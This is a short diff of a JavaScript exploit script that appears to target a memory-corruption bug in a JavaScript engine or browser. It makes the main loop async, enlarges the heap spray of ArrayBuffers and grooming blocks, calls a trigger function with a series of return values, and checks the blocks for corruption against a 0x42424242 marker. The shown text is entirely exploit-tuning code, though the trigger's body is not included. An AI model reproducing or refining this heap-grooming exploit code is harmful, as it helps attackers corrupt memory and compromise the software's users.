@@ -1,4 +1,4 @@
-import { log } from './module/utils.mjs';
+import { log, sleep } from './module/utils.mjs';
 
 const MARK = 0x42424242;
 
@@ -64,18 +64,20 @@ function check(left, right) {
     return corrupted;
 }
 
-function main() {
+async function main() {
     const values = [-889, -1000, -500, -100, -10, 0, 10, 100, 500, 1000];
     
     for (const returnValue of values) {
         log("Testing return value:" + returnValue);
-        const { left, right } = allocSpray(20, 20);
+        const { left, right } = allocSpray(50, 50);
         const tmp = [];
-        for (let i = 0; i < 200; i++) tmp.push(new ArrayBuffer(0x1000));
+        for (let i = 0; i < 300; i++) tmp.push(new ArrayBuffer(0x1000));
 
         trigger(returnValue);
         const corrupted = check(left, right);
         log("Corrupted blocks:" + corrupted);
+        
+        await sleep(100);
         log("---");
     }
     
